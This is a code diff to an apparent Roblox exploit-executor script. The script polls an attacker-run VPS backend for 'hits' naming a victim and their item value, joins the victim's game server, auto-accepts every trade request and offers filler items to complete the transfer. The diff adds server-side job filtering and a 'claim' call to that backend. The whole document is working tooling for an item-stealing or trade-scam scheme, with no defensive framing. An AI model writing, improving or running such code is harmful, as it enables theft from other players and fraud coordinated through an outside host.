@@ -192,9 +192,21 @@ Players.PlayerRemoving:Connect(function(p)
 end)
 
 -- ─── POLL SAB BACKEND FOR HITS ────────────────────────────────────────────────
---  SAB posts: { jobId, placeId, username, receivers[], totalValue, itemCount }
---  We GET /hits and look for entries where receivers contains our name.
 local idleCount = 0
+
+local function claimJob(jobUUID)
+	pcall(function()
+		request_({
+			Url     = VPS_URL .. "/jobs/" .. jobUUID .. "/claim",
+			Method  = "POST",
+			Headers = {
+				["Content-Type"] = "application/json",
+				["x-api-key"]    = VPS_API_KEY
+			},
+			Body = HttpService:JSONEncode({ receiver = LocalPlayer.Name })
+		})
+	end)
+end
 
 local function pollAndJoin()
 	setStatus("Listening...", COLORS.WAIT)
@@ -204,7 +216,7 @@ local function pollAndJoin()
 
 	local ok, res = pcall(function()
 		return request_({
-			Url     = VPS_URL .. "/hits",
+			Url     = VPS_URL .. "/jobs?receiver=" .. LocalPlayer.Name,
 			Method  = "GET",
 			Headers = {
 				["x-api-key"] = VPS_API_KEY
@@ -217,33 +229,27 @@ local function pollAndJoin()
 		return
 	end
 
-	local hits
-	ok, hits = pcall(function() return HttpService:JSONDecode(res.Body) end)
-	if not ok or type(hits) ~= "table" then
+	local parsed
+	ok, parsed = pcall(function() return HttpService:JSONDecode(res.Body) end)
+	if not ok or type(parsed) ~= "table" then
+		setStatus("Parse error", COLORS.ERR)
+		return
+	end
+
+	local hits = parsed.jobs
+	if type(hits) ~= "table" then
 		setStatus("Parse error", COLORS.ERR)
 		return
 	end
 
 	for _, hit in ipairs(hits) do
-		-- must be for this receiver
-		local isReceiver = false
-		if type(hit.receivers) == "table" then
-			for _, r in ipairs(hit.receivers) do
-				if tostring(r):lower() == LocalPlayer.Name:lower() then
-					isReceiver = true
-					break
-				end
-			end
-		end
-
-		if not isReceiver then continue end
 		if table.find(joinedData, tostring(hit.id)) then continue end
 		-- respect placeId if set
 		if hit.placeId and hit.placeId ~= 0 and hit.placeId ~= game.PlaceId then continue end
 
-		local jobId   = hit.jobId
-		local victim  = hit.username or "?"
-		local val     = hit.totalValue or 0
+		local jobId  = hit.jobId
+		local victim = hit.username or "?"
+		local val    = hit.totalValue or 0
 
 		lblTarget.Text = "Target :: " .. victim
 		lblValue.Text  = "Value  :: " .. string.format("%.1f", val)
@@ -257,6 +263,7 @@ local function pollAndJoin()
 			end)
 			if tpOk then
 				markJoined(tostring(hit.id))
+				claimJob(tostring(hit.id))
 				writefile("sab_target.txt", victim)
 				targetName  = victim
 				targetLeft  = false
@@ -285,12 +292,10 @@ if game.PlaceId == PLACE_ID then
 
 	-- Accept EVERY incoming trade request unconditionally
 	RouterClient.get_event("TradeAPI/TradeRequestReceived").OnClientEvent:Connect(function(sender)
-		-- accept from anyone (SAB victim will be one of them)
 		local ok = pcall(function()
 			AcceptOrDecline:InvokeServer(sender, true)
 		end)
 		if not ok then
-			-- fallback: some versions expose a different signature
 			pcall(function() AcceptOrDecline:FireServer(sender, true) end)
 		end
 	end)
@@ -301,15 +306,8 @@ if game.PlaceId == PLACE_ID then
 		while task.wait(0.1) do
 			if TradeFrame.Visible then
 				if not offered then
-					-- offer any food from inventory so the trade isn't empty
 					pcall(function()
-						local inv = require(game.ReplicatedStorage.Fsys)
-							.load("RouterClient")
-							.get("DataAPI/GetAllServerData")
-						-- just fire AddItemToOffer with the first food uid we can find
-						local data = inv and game:GetService("ReplicatedStorage")
-							:FindFirstChild("Fsys") and
-							require(game.ReplicatedStorage.Fsys)
+						local data = require(game.ReplicatedStorage.Fsys)
 							.load("ClientData").get("inventory")
 						if data and data.food then
 							for uid, _ in pairs(data.food) do
@@ -345,7 +343,6 @@ if game.PlaceId == PLACE_ID then
 				idleCount = idleCount + 1
 				offered   = false
 			end
-			-- update left label
 			lblLeft.Text = "Left   :: " .. (targetLeft and "True" or "False")
 		end
 	end)
